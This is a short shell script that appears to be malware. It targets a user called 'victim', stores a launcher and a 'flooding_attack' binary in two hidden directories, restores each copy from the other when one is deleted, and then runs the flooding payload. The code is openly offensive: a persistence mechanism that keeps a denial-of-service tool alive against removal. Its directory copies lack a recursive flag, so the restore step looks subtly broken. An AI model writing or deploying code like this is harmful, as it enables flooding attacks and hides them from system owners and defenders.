#!/bin/sh

home_dir="/home/victim"
launch_dir=".launch_attack"
dir01=".etc/.module"
dir02=".var/.module"
launch_file="launching_attack.sh"
flooding_file="flooding_attack"

check_and_restore() {
  if [ ! -d "$home_dir/$dir01" ] || [ ! -f "$home_dir/$dir01/$launch_file" ] || [ ! -f "$home_dir/$dir01/$flooding_file" ]
  then
    cp "$home_dir/$dir02" "$home_dir/$dir01"
  fi
  if [ ! -d "$home_dir/$dir02" ] || [ ! -f "$home_dir/$dir02/$launch_file" ] || [ ! -f "$home_dir/$dir02/$flooding_file" ]
  then
    cp "$home_dir/$dir01" "$home_dir/$dir02"
  fi
}

payload() {
  $home_dir/$dir01/flooding_attack
}

main() {
  check_and_restore
  payload
}
main
